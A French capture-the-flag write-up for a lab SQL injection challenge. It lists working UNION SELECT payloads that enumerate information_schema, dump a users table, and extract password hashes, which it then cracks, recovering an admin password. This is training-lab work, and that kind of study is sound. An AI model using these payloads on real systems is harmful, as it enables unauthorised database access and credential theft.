# 08 SQL Injection

- On est allés sur la page members
- On a testé de mettre un peu n'importe quoi dans le champ
- On se retrouve avec une erreur de db "Unknown column 'asfasfsa' in 'where clause'"
- On esssaie alors de faire des injections
- On utilise ce pattern `1 Union ...` pour récuperer plus d'infos
- A l'aide de cette commande `1 UNION SELECT CONCAT(0x7c,table_schema,0x7c,table_name,0x7c), column_name FROM information_schema.columns`
on récupère l'intégralité des bases de données, tables et colonnes
- On remarque alors que la table `Member_Sql_Injection` contient plus de champs que ce qui est affiché lors d'une requete normale
- On recupere alors tous les champs de tous les users avec cette requete `1 UNION SELECT CONCAT(user_id, 0x0a, first_name, 0x0a, last_name, 0x0a, town, 0x0a, country, 0x0a, planet, 0x0a, Commentaire, 0x0a, countersign), null FROM Member_Sql_Injection.users`
- On constate ces valeurs
"
Decrypt this password -> then lower all the char. Sh256 on it and it's good !
5ff9d0165b4f92b14994e5c685cdce28
"
- On passe le mdp dans un detecteur de hash puis dehasheur md5 -> FortyTwo
- On suit le reste des consignes
- Et hop, flag


## Annexe

Lors de notre aventure, nous avons constaté une db du nom de `Member_Brute_Force`
Par curiosité on a donc fait la requete suivante dessus

```
1 UNION SELECT CONCAT(id, 0x0a, username, 0x0a, password), null FROM Member_Brute_Force.db_default`
```

On a déhashé les mots de passe, ce qui donne le mdp `shadow` pour l'admin et root
Ça ne va pas nos empecher de faire ça "comme il faut", par le bruteforce quoi.

1 UNION SELECT CONCAT(id, 0x0a, url, 0x0a, title, 0x0a, comment), null FROM Member_images.list_images
